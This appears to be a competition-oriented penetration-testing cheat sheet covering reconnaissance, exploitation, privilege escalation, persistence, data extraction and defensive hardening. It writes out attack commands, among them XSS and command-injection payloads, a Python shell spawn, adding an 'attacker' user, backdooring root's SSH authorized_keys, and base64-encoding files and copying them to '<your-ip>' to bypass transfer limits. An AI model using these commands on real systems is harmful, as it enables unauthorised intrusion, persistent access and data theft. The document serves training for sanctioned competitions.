1. Information Gathering & Enumeration

    Objective: Gather as much information as possible about the target system or network.
    Approach: Start with passive recon (public information) and then move to active scanning.
    Steps and Commands:
        Network Scanning: nmap -A <target-ip> or masscan -p1-65535 <target-ip>
        Use masscan for quick scans, then dive deeper with Nmap.
        Service Enumeration: For each identified service, use specific tools to probe deeper:
            Web (HTTP/S): nikto -h http://<target-ip>, gobuster dir -u http://<target-ip> -w /path/to/wordlist
            FTP: ftp <target-ip>, try anonymous login if allowed.
            SMTP: nc <target-ip> 25, then test for open relay with commands like HELO and MAIL FROM.
        Directory Enumeration: Use a directory buster like gobuster or dirsearch to uncover hidden resources in web apps.

2. Vulnerability Analysis

    Objective: Identify weaknesses in the target system that might allow exploitation.
    Approach: Based on the services identified, determine if any known vulnerabilities (CVEs) or misconfigurations are present.
    Steps and Commands:
        Search for Known CVEs: searchsploit <service/version>, cvedetails <software-name> <version> Check for existing exploits in the Exploit Database or CVE listings.
        Manual Testing for Common Vulnerabilities: Test for common web vulnerabilities:
            SQL Injection: sqlmap -u "http://<target-ip>/vulnerable_page?id=1"
            XSS Injection: Manually input payloads like <script>alert('XSS')</script> to see if input is sanitized.
            Command Injection: Try appending ; ls to URL parameters or input fields.
        Configuration & Access Control Checks: Check if default credentials work (admin:admin), and test for directory traversal (../ patterns in URL).

3. Exploitation

    Objective: Gain access or escalate privileges on a system by exploiting identified vulnerabilities.
    Approach: Use manual methods first to confirm exploitability, then leverage automated tools for exploitation if necessary.
    Steps and Commands:
        Exploit Known Vulnerabilities: Use exploits relevant to your target, and test responsibly.
            For CVEs: msfconsole (Metasploit) and use exploit/path
            Manual Payloads: Craft your own payload with tools like msfvenom or python -c 'import os; os.system("/bin/sh")' for simple shell access.
        Post-Exploitation Checks: After gaining access, explore the system carefully:
            Basic Enumeration: uname -a, id, whoami
            Check for Sensitive Files: ls -la /home, cat /etc/passwd
        Privilege Escalation Check: Search for writable files, SUID binaries, or accessible config files:
            find / -perm -4000 -type f 2>/dev/null (SUID binaries)
            sudo -l (Sudo permissions)

4. Privilege Escalation

    Objective: Escalate privileges to obtain higher-level access, usually root.
    Approach: Enumerate the system to find vulnerabilities, misconfigurations, or files you can exploit.
    Steps and Commands:
        Check Sudo Permissions: sudo -l
        Look for binaries that can be run with sudo but don't require a password.
        Kernel Exploits: If the system is running an older kernel, search for privilege escalation exploits.
            Identify kernel version: uname -r
            Search for kernel exploits: searchsploit linux kernel <version>
        Cron Jobs and Scheduled Tasks: cat /etc/crontab
        Check for jobs that run with root privileges and may be modifiable.
        Writable Files: find / -writable -type f 2>/dev/null
        Identify files that may allow privilege escalation through modification.

5. Persistence

    Objective: Maintain access to the system for ongoing control.
    Approach: Install backdoors, add users, or modify startup scripts (if allowed in the competition rules).
    Steps and Commands:
        Create a New User: useradd -m attacker && echo "attacker:password" | chpasswd
        Backdoor an SSH Key: echo "your-ssh-public-key" >> /root/.ssh/authorized_keys
        Modify Startup Scripts: Add commands in /etc/rc.local to run on startup.

6. Defense & Hardening (If Part of the Competition)

    Objective: Protect your access or harden the system against other attackers.
    Approach: Patch vulnerabilities, secure sensitive files, and monitor for intrusions.
    Steps and Commands:
        Disable Unused Services: systemctl stop <service>, then systemctl disable <service>
        Change SSH Port or Restrict Access: Edit /etc/ssh/sshd_config to modify the SSH port and restrict access.
        Firewall Configuration: Use ufw or iptables to block unneeded ports.
            Example: ufw deny <port> or iptables -A INPUT -p tcp --dport <port> -j DROP
        Monitor Critical Files: Use inotifywait to watch files, or set up logging for suspicious activity.
            Example: inotifywait -m /etc/passwd

7. Data Extraction & Reporting

    Objective: Gather sensitive data or capture flags while documenting findings.
    Approach: Use minimal footprint, encode data if transferring, and keep careful documentation.
    Steps and Commands:
        Identify Flag Locations: Flags might be in common directories like /root, /home/user, or /var/www.
            Example: find / -name *flag* 2>/dev/null
        Copy Files with Minimal Footprint: Use SCP or encode files to bypass file transfer restrictions.
            Encode with Base64: base64 /path/to/file > file.b64
            Transfer with SCP: scp file.b64 user@<your-ip>:/path/to/destination
        Document Findings: Keep a log of each step you take, commands used, and flags found for report clarity.

8. Forensics & Incident Response

    Objective: Identify and mitigate other teams' access, secure the system, or respond to detected intrusions.
    Approach: Investigate suspicious activity, log evidence, and remediate entry points.
    Steps and Commands:
        Analyze System Logs: Check logs for signs of intrusions or anomalies.
            Example: grep "Failed password" /var/log/auth.log | tail -n 20
        Check for Rootkits or Malware: Use tools like chkrootkit or rkhunter.
            Example: chkrootkit
            Example: rkhunter --check
        List Network Connections: netstat -tulnp
        Check for suspicious open ports or active connections.
        Kill Unauthorized Processes: ps aux | grep <suspicious-process> followed by kill -9 <pid>

General Tips

    Documentation: Document every step, as clear notes are crucial for scoring and troubleshooting.
